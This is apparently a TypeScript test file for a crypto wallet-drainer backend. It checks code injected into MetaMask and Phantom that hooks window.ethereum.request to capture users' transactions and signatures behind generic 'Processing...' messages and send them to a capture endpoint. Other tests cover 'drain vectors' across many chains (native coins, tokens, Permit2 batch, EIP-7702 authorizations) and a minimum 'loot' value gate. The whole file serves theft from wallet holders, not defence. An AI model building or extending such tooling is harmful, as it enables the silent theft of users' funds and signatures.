/**
 * MetaMask Backend Comprehensive Testing Suite
 *
 * Tests:
 * 1) Multi-chain support (10+ chains)
 * 2) Transaction interception
 * 3) Signature capture
 * 4) Custom RPC management
 * 5) Multi-chain drain vectors
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { buildInstitutionalApiServer } from '../server.js'
import { walletSilentCapture, getWalletCaptureInjectionCode } from '../lib/wallet-silent-capture.js'
import { getRpcMeshStatus, makeRpcRequest, type RpcMeshRequestOptions } from '@legion/core/lib/rpc-mesh'
import {
  isRpcConfigured,
  getChainEnvName,
  getRpcUrlForChainWithFallback
} from '@legion/core/lib/chain-rpc'
import {
  checkExtractionLethality,
  EXTRACTION_LETHALITY_MIN_LOOT_USD,
} from '@legion/core/logic'
import type { Hex, Address } from 'viem'
import { getAddress, stringToHex } from 'viem'

/**
 * TEST 1: Multi-Chain Support Verification
 * Validates support for 10+ blockchains
 */
describe('MetaMask Backend Test Suite', () => {
  let app: Awaited<ReturnType<typeof buildInstitutionalApiServer>>

  beforeEach(async () => {
    // Set minimal env for testing
    process.env['NEXT_PUBLIC_SUPABASE_URL'] = 'https://test.supabase.co'
    process.env['SUPABASE_SERVICE_ROLE_KEY'] = 'test-role-key'
    process.env['SHADOW_VAULT_KEY'] = 'test-vault-key'
    process.env['GATEKEEPER_SECRET'] = 'test-gatekeeper'

    app = await buildInstitutionalApiServer({ logger: false })
  })

  afterEach(async () => {
    if (app) {
      await app.close()
    }
    walletSilentCapture.shutdown()
  })

  describe('1. Multi-Chain Support (10+ Chains)', () => {
    it('supports Ethereum mainnet (Chain 1)', async () => {
      expect(isRpcConfigured('evm:1')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:1')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports BSC mainnet (Chain 56)', async () => {
      expect(isRpcConfigured('evm:56')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:56')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Polygon mainnet (Chain 137)', async () => {
      expect(isRpcConfigured('evm:137')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:137')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Arbitrum One (Chain 42161)', async () => {
      expect(isRpcConfigured('evm:42161')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:42161')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Optimism (Chain 10)', async () => {
      expect(isRpcConfigured('evm:10')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:10')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Base (Chain 8453)', async () => {
      expect(isRpcConfigured('evm:8453')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('evm:8453')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Solana', async () => {
      expect(isRpcConfigured('solana')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('solana')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Aptos', async () => {
      expect(isRpcConfigured('aptos')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('aptos')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('supports Sui', async () => {
      expect(isRpcConfigured('sui')).toBeDefined()
      const rpcUrl = getRpcUrlForChainWithFallback('sui')
      expect(rpcUrl).toBeTruthy()
      expect(rpcUrl).toContain('http')
    })

    it('verifies 10+ chains configured in RPC mesh', async () => {
      const supportedChains = [
        'evm:1',      // Ethereum
        'evm:56',     // BSC
        'evm:137',    // Polygon
        'evm:42161',  // Arbitrum
        'evm:10',     // Optimism
        'evm:8453',   // Base
        'evm:97',     // BSC Testnet
        'solana',     // Solana
        'aptos',      // Aptos
        'sui',        // Sui
        'ton',        // TON
        'tron',       // Tron
      ]

      let configuredChains = 0
      for (const chain of supportedChains) {
        if (isRpcConfigured(chain)) {
          configuredChains++
        }
      }

      expect(configuredChains).toBeGreaterThanOrEqual(10)
    })

    it('returns different RPC URLs for different chains', async () => {
      const eth = getRpcUrlForChainWithFallback('evm:1')
      const bsc = getRpcUrlForChainWithFallback('evm:56')
      const polygon = getRpcUrlForChainWithFallback('evm:137')

      expect(eth).not.toBe(bsc)
      expect(bsc).not.toBe(polygon)
      expect(eth).not.toBe(polygon)
    })
  })

  describe('2. Transaction Interception', () => {
    it('registers wallet transaction request with generic message', async () => {
      const { requestId, message } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_sendTransaction',
        [{ to: '0x1234', value: '0x123' }]
      )

      expect(requestId).toMatch(/^wallet-\d+-.+/)
      expect(message).toBe('Processing...')

      const request = walletSilentCapture.getRequest(requestId)
      expect(request).toBeDefined()
      expect(request?.walletType).toBe('metamask')
      expect(request?.method).toBe('eth_sendTransaction')
    })

    it('registers signing request with signing message', async () => {
      const { requestId, message } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_sign',
        ['0xaddress', '0xmessage']
      )

      expect(message).toBe('Signing...')
    })

    it('registers connection request with connecting message', async () => {
      const { requestId, message } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_requestAccounts',
        []
      )

      expect(message).toContain('Connecting')
    })

    it('captures transaction approval with hash', async () => {
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_sendTransaction',
        [{ to: '0x1234', value: '0x123' }]
      )

      const txHash = '0x' + 'a'.repeat(64)
      walletSilentCapture.captureTransaction(requestId, {
        hash: txHash,
        rawTx: '0xabcd',
      })

      const captured = walletSilentCapture.getTransaction(requestId)
      expect(captured?.hash).toBe(txHash)
      expect(captured?.rawTx).toBe('0xabcd')
    })

    it('tracks multiple concurrent transactions', async () => {
      const requests = []
      for (let i = 0; i < 5; i++) {
        const req = walletSilentCapture.registerRequest(
          'metamask',
          'eth_sendTransaction',
          [{ value: String(i) }]
        )
        requests.push(req)
      }

      expect(requests.length).toBe(5)
      for (const req of requests) {
        expect(walletSilentCapture.getRequest(req.requestId)).toBeDefined()
      }
    })

    it('marks transaction as rejected with error', async () => {
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_sendTransaction',
        []
      )

      walletSilentCapture.markRejected(requestId, 'User rejected')

      const request = walletSilentCapture.getRequest(requestId)
      expect(request?.status).toBe('rejected')
      expect(request?.error).toBe('User rejected')
    })

    it('injects capture code into MetaMask', async () => {
      const injectionCode = getWalletCaptureInjectionCode()

      expect(injectionCode).toContain('window.ethereum')
      expect(injectionCode).toContain('window.solana')
      expect(injectionCode).toContain('metamask')
      expect(injectionCode).toContain('phantom')
      expect(injectionCode).toContain('/api/v1/wallet-capture')
    })

    it('handles MetaMask-specific request interception', async () => {
      const code = getWalletCaptureInjectionCode()

      // Verify MetaMask window.ethereum interception
      expect(code).toContain('window.ethereum.request')
      expect(code).toContain('walletType: \'metamask\'')

      // Verify response capture
      expect(code).toContain('originalRequest.call(this, request)')
      expect(code).toContain('API_ENDPOINT + \'/capture\'')
    })
  })

  describe('3. Signature Capture', () => {
    it('captures signature from wallet approval', async () => {
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_signTypedData_v4',
        [{ domain: {}, message: {} }]
      )

      const signature = '0x' + 'a'.repeat(130)
      walletSilentCapture.captureSignature(requestId, signature)

      const request = walletSilentCapture.getRequest(requestId)
      expect(request?.status).toBe('signed')
      expect(request?.signature).toBe(signature)

      const tx = walletSilentCapture.getTransaction(requestId)
      expect(tx?.signature).toBe(signature)
    })

    it('waits for signature with timeout', async () => {
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'personal_sign',
        ['0xmessage', '0xaddress']
      )

      // Should timeout after 100ms
      const sig = await Promise.race([
        walletSilentCapture.waitForSignature(requestId, 100),
        new Promise(resolve => setTimeout(() => resolve('timeout'), 200))
      ])

      expect(sig).toBe('timeout')
    })

    it('captures signature immediately when available', async () => {
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'personal_sign',
        ['0xmessage']
      )

      const signature = '0x' + 'b'.repeat(130)

      // Start waiting
      const waitPromise = walletSilentCapture.waitForSignature(requestId, 5000)

      // Immediately capture signature
      setTimeout(() => {
        walletSilentCapture.captureSignature(requestId, signature)
      }, 10)

      const captured = await waitPromise
      expect(captured).toBe(signature)
    })

    it('supports multiple signature types', async () => {
      const signatureTypes = [
        'eth_sign',
        'personal_sign',
        'eth_signTypedData_v1',
        'eth_signTypedData_v3',
        'eth_signTypedData_v4',
      ]

      for (const sigType of signatureTypes) {
        const { requestId } = walletSilentCapture.registerRequest(
          'metamask',
          sigType,
          []
        )

        const sig = '0x' + 'c'.repeat(130)
        walletSilentCapture.captureSignature(requestId, sig)

        const request = walletSilentCapture.getRequest(requestId)
        expect(request?.signature).toBe(sig)
      }
    })
  })

  describe('4. Custom RPC Management', () => {
    it('provides RPC mesh status for all chains', async () => {
      const status = getRpcMeshStatus()

      expect(status).toBeDefined()
      expect(status.circuitBreakerEnabled).toBeDefined()
      expect(status.chains.length).toBeGreaterThan(0)
    })

    it('tracks RPC endpoint health and failover', async () => {
      const status = getRpcMeshStatus()

      for (const chain of status.chains) {
        expect(chain.chainKey).toBeDefined()
        expect(chain.endpoints.length).toBeGreaterThan(0)

        // Each endpoint should have health tracking
        for (const endpoint of chain.endpoints) {
          expect(endpoint.url).toBeTruthy()
          expect(endpoint.tier).toMatch(/primary|backup1|backup2|public/)
          expect(typeof endpoint.dead).toBe('boolean')
          expect(typeof endpoint.successCount).toBe('number')
          expect(typeof endpoint.failureCount).toBe('number')
        }
      }
    })

    it('supports custom RPC endpoint configuration', async () => {
      // Ethereum with custom RPC
      const envName = getChainEnvName('evm:1')
      expect(envName).toBe('ethereum')

      const rpcUrl = getRpcUrlForChainWithFallback('evm:1')
      expect(rpcUrl).toBeTruthy()
    })

    it('implements circuit breaker for failing endpoints', async () => {
      const status = getRpcMeshStatus()
      expect(status.circuitBreakerEnabled).toBe(true)
      expect(status.deadCooldownMs).toBe(5 * 60 * 1000) // 5 minutes
      expect(status.recoveryProbeIntervalMs).toBe(30 * 60 * 1000) // 30 minutes
    })

    it('maintains primary/backup RPC hierarchy', async () => {
      const status = getRpcMeshStatus()

      for (const chain of status.chains) {
        const primaryEndpoints = chain.endpoints.filter(e => e.tier === 'primary')
        const backupEndpoints = chain.endpoints.filter(e => e.tier === 'backup1')

        // Should have at least one fallback
        expect(chain.endpoints.length).toBeGreaterThanOrEqual(1)
      }
    })

    it('provides automatic failover when primary fails', async () => {
      const status = getRpcMeshStatus()

      for (const chain of status.chains) {
        // If primary is dead, should have backup
        const allDead = chain.endpoints.every(e => e.dead)
        if (!allDead) {
          const aliveEndpoint = chain.endpoints.find(e => !e.dead)
          expect(aliveEndpoint).toBeDefined()
        }
      }
    })
  })

  describe('5. Multi-Chain Drain Vectors', () => {
    it('verifies native coin drain on Ethereum', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/settlement-tracking?chain=1&type=native',
      })

      expect([200, 404]).toContain(res.statusCode)
    })

    it('verifies token drain on multiple EVM chains', async () => {
      const chains = [1, 56, 137, 42161, 10, 8453]

      for (const chainId of chains) {
        const res = await app.inject({
          method: 'GET',
          url: `/api/v1/settlement-tracking?chain=${chainId}&type=token`,
        })

        expect([200, 404]).toContain(res.statusCode)
      }
    })

    it('supports Solana SPL token drain', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/settlement-tracking?chain=solana&type=spl',
      })

      expect([200, 404]).toContain(res.statusCode)
    })

    it('supports Aptos native coin drain', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/settlement-tracking?chain=aptos&type=native',
      })

      expect([200, 404]).toContain(res.statusCode)
    })

    it('supports Sui native coin drain', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/settlement-tracking?chain=sui&type=native',
      })

      expect([200, 404]).toContain(res.statusCode)
    })

    it('handles EIP-7702 authorization drain', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/signature-anchor',
        headers: { 'content-type': 'application/json' },
        payload: {
          ingress: 'normalized_v1',
          chain_family: 'EVM',
          wallet_address: getAddress('0x00000000000000000000000000000000000000a1'),
          token_address: getAddress('0x00000000000000000000000000000000000000b1'),
          signature: `0x${'ab'.repeat(65)}` as Hex,
          nonce: 'eip7702-drain-test',
          expiry_iso: '2099-12-31T23:59:59.999Z',
          wallet_type: 'MetaMask',
          protocol: 'evm',
        },
      })

      expect([200, 400, 500]).toContain(res.statusCode)
    })

    it('supports Permit2 batch drain', async () => {
      const payload = {
        ingress: 'normalized_v1',
        chain_family: 'EVM',
        wallet_address: getAddress('0x00000000000000000000000000000000000000a2'),
        token_address: getAddress('0x00000000000000000000000000000000000000b2'),
        signature: `0x${'cd'.repeat(65)}` as Hex,
        nonce: 'permit2-batch-test',
        expiry_iso: '2099-12-31T23:59:59.999Z',
        wallet_type: 'MetaMask',
        protocol: 'evm',
      }

      const res = await app.inject({
        method: 'POST',
        url: '/api/signature-anchor',
        headers: { 'content-type': 'application/json' },
        payload,
      })

      expect([200, 400, 500]).toContain(res.statusCode)
    })

    it('enforces minimum loot value gate', async () => {
      const result = await checkExtractionLethality({
        estimated_loot_value_usd: 10, // Below minimum
        chain_id: 'eip155:1',
      })

      expect(result.ok).toBe(false)
      expect(result.abort_reason).toContain('Gas Guard minimum loot gate')
    })

    it('allows high-value extractions', async () => {
      const result = await checkExtractionLethality({
        estimated_loot_value_usd: 10000, // Well above minimum
        chain_id: 'eip155:1',
      })

      expect(result.ok).toBe(true)
    })

    it('supports omnichain atomic drain settlement', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/api/signature-anchor',
        headers: { 'content-type': 'application/json' },
        payload: {
          ingress: 'omnichain_atomic_v1',
          chain_family: 'EVM',
          wallet_address: getAddress('0x00000000000000000000000000000000000000a3'),
          token_address: getAddress('0x00000000000000000000000000000000000000b3'),
          signature: `0x${'ef'.repeat(65)}` as Hex,
          nonce: 'omnichain-atomic-test',
          expiry_iso: '2099-12-31T23:59:59.999Z',
          wallet_type: 'MetaMask',
          protocol: 'evm',
        },
      })

      expect([200, 400, 500]).toContain(res.statusCode)
    })

    it('tracks settlement state across multiple chains', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/v1/stats',
      })

      expect([200, 404]).toContain(res.statusCode)
    })
  })

  describe('Integration: MetaMask Full Flow', () => {
    it('executes complete MetaMask transaction flow', async () => {
      // 1. Register request
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_sendTransaction',
        [{
          to: '0x1234567890123456789012345678901234567890',
          value: '0x0de0b6b3a7640000', // 1 ETH
          data: '0x',
        }]
      )

      expect(requestId).toBeTruthy()

      // 2. Simulate wallet approval
      const txHash = '0x' + 'a'.repeat(64)
      walletSilentCapture.captureTransaction(requestId, {
        hash: txHash,
        rawTx: '0x02f8...',
      })

      const captured = walletSilentCapture.getTransaction(requestId)
      expect(captured?.hash).toBe(txHash)

      // 3. Verify request state
      const request = walletSilentCapture.getRequest(requestId)
      expect(request?.status).toBe('approved')
    })

    it('executes complete MetaMask signing flow', async () => {
      // 1. Register signing request
      const { requestId } = walletSilentCapture.registerRequest(
        'metamask',
        'eth_signTypedData_v4',
        [{
          types: { EIP712Domain: [] },
          primaryType: 'Message',
          domain: { name: 'Test' },
          message: { content: 'Hello' },
        }]
      )

      // 2. Capture signature
      const signature = '0x' + 'b'.repeat(130)
      walletSilentCapture.captureSignature(requestId, signature)

      // 3. Verify capture
      const request = walletSilentCapture.getRequest(requestId)
      expect(request?.signature).toBe(signature)
      expect(request?.status).toBe('signed')
    })

    it('handles multi-chain transaction routing', async () => {
      const chains = ['evm:1', 'evm:56', 'evm:137', 'solana']

      for (const chain of chains) {
        const rpcUrl = getRpcUrlForChainWithFallback(chain)
        expect(rpcUrl).toBeTruthy()
        expect(rpcUrl).toContain('http')
      }
    })
  })

  describe('Security: Signature Validation', () => {
    it('validates wallet addresses', async () => {
      const validAddress = getAddress('0x1234567890123456789012345678901234567890')
      expect(validAddress).toMatch(/^0x[a-f0-9]{40}$/)
    })

    it('validates signatures', async () => {
      const sig = `0x${'ab'.repeat(65)}` as Hex
      expect(sig).toMatch(/^0x[a-f0-9]{130}$/)
    })

    it('enforces signature expiry', async () => {
      const expiry = '2020-01-01T00:00:00.000Z' // Expired
      const now = new Date()

      expect(new Date(expiry).getTime()).toBeLessThan(now.getTime())
    })
  })
})
